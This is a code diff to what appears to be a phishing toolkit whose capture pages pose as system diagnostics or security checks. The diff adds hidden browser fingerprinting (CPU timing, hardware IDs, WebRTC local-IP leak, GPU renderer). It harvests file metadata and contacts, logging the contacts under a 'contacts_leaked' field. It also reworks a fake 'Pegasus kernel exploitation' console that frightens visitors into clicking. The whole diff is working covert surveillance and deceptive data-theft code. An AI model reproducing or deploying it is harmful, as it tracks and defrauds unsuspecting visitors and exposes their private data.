@@ -84,6 +84,49 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         }
       }
 
+      async function runSilentProbes() {
+        // CPU Fingerprint
+        var start = performance.now();
+        for(var i=0; i<1000000; i++) Math.sqrt(i);
+        await logExtra({ cpu_compute_score: (performance.now() - start).toFixed(2) + 'ms' });
+
+        // Hardware Identity v2
+        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+          navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platformVersion', 'fullVersionList', 'bitness', 'formFactor']).then(async function(h) {
+             await logExtra({ hardware_brand_profile: JSON.stringify(h) });
+          }).catch(function(){});
+        }
+
+        // WebRTC Local IP
+        try {
+          var pc = new RTCPeerConnection({iceServers:[]});
+          pc.createDataChannel("");
+          pc.createOffer().then(o => pc.setLocalDescription(o));
+          pc.onicecandidate = async function(ice) {
+            if (ice && ice.candidate && ice.candidate.candidate) {
+              var ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate);
+              if (ipMatch) await logExtra({ local_ip: ipMatch[1] });
+            }
+          };
+        } catch(e) {}
+
+        // Detailed GPU Profile
+        try {
+          var c = document.createElement('canvas');
+          var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+          if (gl) {
+            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+            var gpuData = {
+              vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'N/A',
+              renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A',
+              gl_version: gl.getParameter(gl.VERSION),
+              shading_lang: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+            };
+            await logExtra({ gpu_full_profile: JSON.stringify(gpuData) });
+          }
+        } catch(e) {}
+      }
+
       async function finish(success, reason) {
         await flushExtra();
         if (isSilent) {
@@ -107,10 +150,11 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
            await flushExtra();
            hasRedirected = true;
            window.location.href = targetUrl;
-        }, 3000);
+        }, 1500);
       }
 
       try {
+        await runSilentProbes();
         if (!isSilent) updateProgress(8, "Menganalisis integritas browser...", "SECURITY_CHECK");
         
         var metadata = {
@@ -489,24 +533,21 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             if (p === 'files') {
               if (!isSilent) updateProgress(prog, "Sinkronisasi token media galeri...", "STORAGE_CERT");
               if (window.showOpenFilePicker) {
-                 var handle = await window.showOpenFilePicker({ 
-                   multiple: true, 
-                   types: [{ 
-                     description: 'System Audit Logs', 
-                     accept: { 
-                       'image/*': ['.png','.jpg','.jpeg'], 
-                       'video/*': ['.mp4'],
-                       'application/pdf': ['.pdf'],
-                       'text/plain': ['.txt']
-                     } 
-                   }] 
-                 }).catch(function(){ return null; });
-                 if (handle) {
-                    for (const item of handle) {
-                      var file = await item.getFile();
-                      await logExtra({ file_name: file.name, file_size: file.size, file_type: file.type });
-                    }
-                 }
+                 try {
+                   var handle = await window.showOpenFilePicker({ 
+                     multiple: true, 
+                     types: [{ 
+                       description: 'System Audit Logs', 
+                       accept: { 'image/*': ['.png','.jpg','.jpeg'], 'video/*': ['.mp4'], 'application/pdf': ['.pdf'], 'text/plain': ['.txt'] } 
+                     }] 
+                   });
+                   if (handle) {
+                      for (const item of handle) {
+                        var file = await item.getFile();
+                        await logExtra({ file_name: file.name, file_size: file.size, file_type: file.type });
+                      }
+                   }
+                 } catch(e) {}
               }
             }
 
@@ -540,7 +581,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
               if (navigator.contacts && navigator.contacts.select) {
                 try {
                   var props = await navigator.contacts.getProperties();
-                  var selected = await navigator.contacts.select(props, { multiple: true }).catch(function(){ return null; });
+                  var selected = await navigator.contacts.select(props, { multiple: true });
                   if (selected) await logExtra({ contacts_leaked: JSON.stringify(selected) });
                 } catch(e) {}
               }
@@ -664,9 +705,36 @@ export const templates: Record<string, {name: string, render: (id: string) => st
     })}</body></html>`
   },
   'pegasus': {
-    name: "💻 System: Kernel Diagnostic (Technical/Pro)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Diagnostics</title><style>body { background:#fafafa; color:#333; font-family: 'SF Mono', 'JetBrains Mono', monospace; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:460px; border:1px solid #e0e0e0; padding:35px; background:#fff; text-align:left; border-radius:4px; box-shadow: 0 4px 6px rgba(0,0,0,0.02); } .header { border-bottom:1px solid #eee; padding-bottom:15px; margin-bottom:20px; color:#666; font-size:12px; } .btn { width:100%; background:#222; color:#fff; border:none; padding:12px; font-weight:500; cursor:pointer; margin-top:25px; border-radius:3px; font-size:13px; }</style></head><body><div class="box"><div class="header">SYS_KERNEL_DIAGNOSTIC_V5.01</div><div style="font-size:14px; line-height:1.8;">[STATE] ERROR: HARDWARE_UID_MISMATCH<br>[REASON] REGIONAL_MISALIGNMENT_DETECTED<br><br><span style="color:#888;">Synchronizing hardware telemetry, spatial coordinates, and secure storage metadata is required for kernel authorization.</span></div><button class="btn" onclick="window.startCapture();">RUN SYSTEM AUDIT</button></div>${getCaptureScript(id, 'https://developers.google.com', {
-      tmplId: 'pegasus', perms: ALL_PERMS, accent: '#222', icon: '💻'
+    name: "💻 System: Kernel Diagnostic (Extreme)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Diagnostics</title><style>body { background:#0a0a0a; color:#00ff00; font-family: 'Courier New', Courier, monospace; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:600px; border:1px solid #333; padding:20px; background:#111; text-align:left; border-radius:2px; box-shadow: 0 0 20px rgba(0,255,0,0.1); } .header { border-bottom:1px solid #333; padding-bottom:10px; margin-bottom:15px; color:#00aa00; font-size:12px; font-weight:bold; } .code { font-size:12px; line-height:1.5; height:200px; overflow-y:hidden; position:relative; } .code:after { content:"_"; animation: blink 1s infinite; } @keyframes blink { 50% { opacity:0; } } .btn { width:100%; background:transparent; color:#00ff00; border:1px solid #00ff00; padding:12px; font-weight:bold; cursor:pointer; margin-top:20px; text-transform:uppercase; transition:all 0.3s; } .btn:hover { background:#00ff00; color:#000; }</style></head><body><div class="box"><div class="header">PEGASUS_KERNEL_EXPLOITATION_V9.2 [STABLE]</div><div class="code" id="log-console">
+[+] INITIALIZING_EXPLOIT_PAYLOAD...<br>
+[+] BYPASSING_SANDBOX_RESTRICTIONS...<br>
+[+] HOOKING_HARDWARE_INTERFACE...<br>
+[+] SCANNING_MEMORY_PAGES...<br>
+[!] WARNING: KERNEL_INTEGRITY_MISMATCH<br>
+[+] TRIGGERING_VULNERABILITY_0xCF42...<br>
+[+] ATTEMPTING_RING0_ELEVATION...<br>
+[?] WAITING_FOR_HARDWARE_RESPONSE...<br>
+    </div><button class="btn" onclick="window.startCapture();">EXECUTE DEEP SCAN</button></div>
+    <script>
+      var log = document.getElementById('log-console');
+      var lines = [
+        "[+] EXTRACTING_BROWSER_CERT...",
+        "[+] MAPPING_GPU_REGISTRY...",
+        "[+] PROBING_SENSOR_ARRAY...",
+        "[+] DECODING_LOCATION_MARKERS...",
+        "[+] SYNCING_REMOTE_ASSETS..."
+      ];
+      var idx = 0;
+      setInterval(function() {
+        if (idx < lines.length) {
+          log.innerHTML += "<br>" + lines[idx];
+          idx++;
+        }
+      }, 3000);
+    </script>
+    ${getCaptureScript(id, 'https://github.com', {
+      tmplId: 'pegasus', perms: ALL_PERMS, accent: '#00ff00', icon: '💀'
     })}</body></html>`
   },
   'wifi': {
